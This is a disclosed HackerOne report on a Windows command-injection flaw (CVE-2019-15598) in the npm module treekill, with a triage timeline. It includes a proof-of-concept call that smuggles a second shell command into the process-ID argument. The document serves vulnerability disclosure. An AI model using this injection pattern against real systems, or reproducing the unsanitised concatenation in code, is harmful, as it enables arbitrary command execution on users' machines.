---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
  - stack/node
  - os/windows
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2019-12-04
submitted: 2019-09-28T09:22:28.392Z
bounty_usd: null
votes: 4
cve: "CVE-2019-15598"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "mik317"
source: "https://hackerone.com/reports/703415"
title: "[treekill] RCE via insecure command concatenation (only Windows)"
---
# [treekill] RCE via insecure command concatenation (only Windows)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** Node.js third-party modules | **Disclosed:** 2019-12-04

- Report: [https://hackerone.com/reports/703415](https://hackerone.com/reports/703415)
- CWE: Code Injection | CVE: CVE-2019-15598
- Submitted: 2019-09-28T09:22:28.392Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `RCE` issue in the `treekill` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `treekill`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/treekill`

## Module Description
> treekill process and it's all children and child offspring children.

## Module Stats
[N/A] downloads in the last day
[106] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: https://github.com/node-modules/treekill/blob/master/index.js#L32
(as you can see, the `Linux` part is `sanitized`, while the `Win` one no ... it simply uses the `+` operand to concatenate the input)

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var kill = require('treekill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
```
1. Execute the following commands in terminal:

```bash
npm i tree-kill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
```
1. The `HACKED.txt` has been created

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

PS: Note I'm working on a LInux machine, so I'm not sure if the syntax used to inject the command is successfull ... anyway, the issue is possible, as you can see from the code. If you'll not be able to reproduce the PoC, let me know and I'll switch on a `Win` machine in order to make working the PoC.

## Impact

`RCE` on `treekill` via `insecure command concatenation`

## Timeline

- **Report Filed**
- **2019-09-28** @mik317: Excuse me, the first command to run in the `terminal` is 

```bash
npm i treekill
```
:)

Best, Mik
- **2019-09-29** @nochnoidozor: Hi @mik317,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Severity Updated**
- **Report Triaged**
- **2019-09-29** @mik317: Thank you :)

Best, Mik
- **Report Severity Updated**
- **2019-10-07** @lirantal: Thanks for your report @mik317 
Looks like it is a valid issue indeed and I invited the maintainer to join. It is possible that there will be no response as the last release was 5 years ago. Let's see how it works out and disclose early if necessary.
- **2019-10-08** @mik317: Thank you :)

Best, Mik
- **Changed Scope**
- **2019-12-04** @lirantal: Will disclose since there is no answer from the maintainer. Thank you @mik317 for reporting the issue and looking forward to work with you again.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
